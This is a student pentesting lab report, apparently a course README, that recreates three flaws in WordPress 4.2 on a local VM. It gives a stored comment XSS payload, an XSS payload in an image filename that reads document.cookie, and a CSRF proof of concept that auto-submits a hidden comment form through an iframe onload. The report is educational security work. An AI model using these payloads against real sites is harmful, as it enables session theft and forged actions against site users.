# Project 7 - WordPress Pentesting

Time spent: 3 hours spent in total

> Objective: Find, analyze, recreate, and document 3 vulnerabilities affecting an old version of WordPress

## Pentesting Report

### 1. Authenticated Stored Cross-Site Scripting (XSS)
  - [X] Summary: inject java script code as a comment 
    - Vulnerability types:XSS
    - Tested in version: 4.2
    - Fixed in version: 4.4
  - [X] GIF Walkthrough: ![Alt Text](https://github.com/rdiaz002/Week_7_Project_WordPress_vs_Kali/blob/master/first_exploit.gif)
  - [X] Steps to recreate: <br />
         -Leave a comment with the following content:<br />
         *\<b onmouseover="alert('This is just a vulnerability')">click me!\</b>*
         
  - [X] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/blob/4.2-branch/wp-comments-post.php)
    
### 2. Cross-Site Scripting with Image File
  - [X] Summary: Upload an image file with some javascript at the end of its file name
    - Vulnerability types:XSS
    - Tested in version:4.2
    - Fixed in version: 4.2.10
  - [X] GIF Walkthrough: ![Alt Text](https://github.com/rdiaz002/Week_7_Project_WordPress_vs_Kali/blob/master/second_exploit.gif)
  - [X] Steps to recreate: <br />
        -create an image file or download an image file. <br />
        -add some javascript to the end of its filename. ex.(\<img src=# onerror=alert(document.cookie)>) <br />
        -upload file to wordpress
  - [X] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0)
### 3. Cross Site Request Forgery
  - [X] Summary: Create a hidden form that can be submitted by another user when the page loads 
    - Vulnerability types: CSRF
    - Tested in version: 4.2
    - Fixed in version: 4.4
  - [X] GIF Walkthrough: ![Alt Text](https://github.com/rdiaz002/Week_7_Project_WordPress_vs_Kali/blob/master/third_exploit.gif)
  - [X] Steps to recreate: <br />
        -create a new comment that includes the javascript code for a new form <br />
        -below that comment create an iframe that will run the form when it loads <br />
        -refresh page <br /> 
        
        Proof of Concept:
          <form action="http://wpdistillery.vm/wp-comments-post.php" method="post" id="commentform2" class="comment-form" novalidate>
            <input name="comment" type="hidden" value="hello there">
            <input type="hidden" name="comment_post_ID" value="3" id="comment_post_ID">
            <input type="hidden" name="comment_parent" id="comment_parent" value="0">
            <input type="hidden" id="_wp_unfiltered_html_comment_disabled" name="_wp_unfiltered_html_comment" value="8bfe964cea">
           </form>

          <iframe src=# onload=document.getElementById('commentform2').submit()> </iframe>
          
         
  - [X] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/blob/4.2-branch/wp-comments-post.php)


## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [2019] [Ronuel Diaz]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
